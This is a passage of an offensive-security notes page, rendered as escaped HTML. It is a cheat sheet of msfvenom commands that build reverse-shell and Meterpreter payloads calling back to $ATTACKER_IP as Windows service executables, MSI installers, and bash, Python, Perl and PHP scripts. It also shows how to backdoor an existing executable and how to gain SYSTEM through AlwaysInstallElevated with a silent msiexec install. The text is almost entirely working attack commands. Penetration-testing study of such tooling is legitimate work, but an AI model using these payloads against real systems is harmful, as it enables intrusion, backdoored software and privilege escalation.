style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.exe&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# 64-bit Windows SERVICE executable (note that these require&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# additional API calls to work, beyond what `-f exe` provides)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; exe-service&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.exe&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Add a meterpreter backdoor to an existing executable&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; x64&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --platform&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; windows&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -x&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $ORIGINAL_EXE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -k&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-b&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\\x00&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $BACKDOORED_EXE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Note that by default msfvenom produces 64-bit executables when using the &lt;code&gt;-f exe&lt;/code&gt;. This doesn’t work, however, if you’re trying to replace a program in &lt;code&gt;Program Files (x86)&lt;/code&gt;. In this case, you’ll need to explicitly instruct msfvenom to encode a 32-bit binary using  &lt;code&gt;-e x86/shikata_ga_nai&lt;/code&gt;.&lt;/p&gt;\n&lt;h2 id=&quot;msi-installers&quot;&gt;MSI installers&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#msi-installers&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;If AlwaysInstallElevated is set to 1 under both of the following registry keys, then MSI installers will run as SYSTEM.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Generate a malicious MSI file with msfvenom:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; windows/x64/shell_reverse_tcp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; msi&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.msi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Then install on the target to get a shell:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;msiexec &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;quiet &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;qn &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;i &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;INSTALLER.msi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;html-applications&quot;&gt;HTML applications&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#html-applications&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Exploit-Windows-HTML-applications-with-msfvenom&quot; data-block=&quot;&quot; data-embed-alias=&quot;Exploit Windows HTML applications with msfvenom&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-Windows-HTML-applications-with-msfvenom&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Exploit-Windows-HTML-applications-with-msfvenom&quot;&gt;Transclude of Exploit-Windows-HTML-applications-with-msfvenom&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;vba-scripts&quot;&gt;VBA scripts&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#vba-scripts&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Exploit-VBA-scripts-with-msfvenom&quot; data-block=&quot;&quot; data-embed-alias=&quot;Exploit VBA scripts with msfvenom&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-VBA-scripts-with-msfvenom&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Exploit-VBA-scripts-with-msfvenom&quot;&gt;Transclude of Exploit-VBA-scripts-with-msfvenom&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;bash-scripts&quot;&gt;Bash scripts&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#bash-scripts&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; cmd/unix/reverse_bash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; raw&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;python-scripts&quot;&gt;Python scripts&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#python-scripts&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; cmd/unix/reverse_python&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; raw&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.py&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;perl-scripts&quot;&gt;Perl scripts&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#perl-scripts&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; cmd/unix/reverse_perl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; raw&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.pl&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;php-scripts&quot;&gt;PHP scripts&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#php-scripts&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; php/meterpreter_reverse_tcp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; raw&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.php&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;asp-scripts&quot;&gt;ASP scripts&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#asp-scripts&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 